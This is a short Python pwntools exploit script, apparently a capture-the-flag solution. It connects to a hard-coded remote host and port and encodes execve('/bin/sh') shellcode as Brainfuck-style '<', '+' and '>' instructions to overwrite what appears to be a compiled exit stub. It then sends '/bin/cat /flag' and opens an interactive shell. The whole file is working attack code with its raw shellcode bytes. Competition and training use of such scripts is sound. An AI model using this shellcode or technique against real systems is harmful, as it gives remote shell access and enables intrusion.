from pwn import *

REMOTE_IP = "140.238.91.110"
REMOTE_PORT = 36369

p = remote(REMOTE_IP, REMOTE_PORT)

p.readuntil(b"Enter your code:\n")

compiled_end = b"\x48\xC7\xC0\x3C\x00\x00\x00\x0F\x05"

shellcode = b"\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"

payload = b""
for i in range(len(compiled_end)):
    payload += b"<"

for i in range(len(compiled_end)):
    payload += b"+" * (int(shellcode[i]) - int(compiled_end[i]) & 0xff)
    payload += b">"

for b in shellcode[len(compiled_end):]:
    payload += b"+" * int(b)
    payload += b">"

p.sendline(payload)

p.clean()

p.sendline(b"/bin/cat /flag")

p.interactive()
